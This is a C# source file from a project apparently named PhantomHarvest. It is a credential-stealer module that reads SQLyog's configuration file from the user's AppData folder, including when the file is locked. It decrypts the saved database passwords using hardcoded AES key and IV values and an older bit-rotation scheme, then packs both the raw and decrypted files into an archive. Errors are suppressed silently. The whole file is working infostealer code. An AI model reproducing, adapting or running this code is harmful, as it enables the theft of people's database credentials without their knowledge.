using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Tools
{
	internal class SQLyog
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SQLyog\\sqlyog.ini");
				if (File.Exists(text))
				{
					byte[] bytes = LockedFile.ReadLockedFile(text);
					if (bytes != null)
					{
						using (MemoryStream ms = new MemoryStream(bytes))
						{
							zip.AddStream(ArchiveManager.Compression.Deflate, SQLyog.ToolName + "/sqlyog.ini", ms, DateTime.Now, "");
						}
						
						string decryptedContent = SQLyog.Decrypt(bytes);
						if (!string.IsNullOrEmpty(decryptedContent))
						{
							using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(decryptedContent)))
							{
								zip.AddStream(ArchiveManager.Compression.Deflate, SQLyog.ToolName + "/sqlyog_decrypted.ini", ms, DateTime.Now, "");
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		private static string OldDecrypt(string text)
		{
			byte[] array = Convert.FromBase64String(text);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)((int)array[i] << 1 | array[i] >> 7);
			}
			return Encoding.UTF8.GetString(array);
		}

		private static string NewDecrypt(string text)
		{
			byte[] array = Convert.FromBase64String(text);
			byte[] array2 = new byte[128];
			Array.Copy(array, array2, array.Length);
			byte[] bytes = new RijndaelManaged
			{
				Key = SQLyog.keyArray,
				IV = SQLyog.ivArray,
				BlockSize = 128,
				Mode = CipherMode.CFB,
				Padding = PaddingMode.None
			}.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length).Take(array.Length).ToArray<byte>();
			return Encoding.UTF8.GetString(bytes);
		}

		private static string Decrypt(byte[] fileBytes)
		{
			string fileContent = Encoding.Default.GetString(fileBytes);
			Pixini pixini = Pixini.LoadFromMemory(fileContent); // 从内存加载 INI 内容
			
			foreach (KeyValuePair<string, List<IniLine>> keyValuePair in pixini.sectionMap)
			{
				List<IniLine> value = keyValuePair.Value;
				bool flag = false;
				string text = "";
				foreach (IniLine iniLine in value)
				{
					if (iniLine.key == "Password")
					{
						text = iniLine.value;
					}
					if (iniLine.key == "Isencrypted")
					{
						flag = (iniLine.value == "1");
					}
				}
				if (!string.IsNullOrEmpty(text))
				{
					string val = flag ? SQLyog.NewDecrypt(text) : SQLyog.OldDecrypt(text);
					pixini.Set<string>("Password", keyValuePair.Key, val);
				}
			}
			return pixini.ToString();
		}

		public static string ToolName = "SQLyog";

		private static byte[] keyArray = new byte[]
		{
			41,
			35,
			190,
			132,
			225,
			108,
			214,
			174,
			82,
			144,
			73,
			241,
			201,
			187,
			33,
			143
		};

		private static byte[] ivArray = new byte[]
		{
			179,
			166,
			219,
			60,
			135,
			12,
			62,
			153,
			36,
			94,
			13,
			28,
			6,
			183,
			71,
			222
		};
	}
}
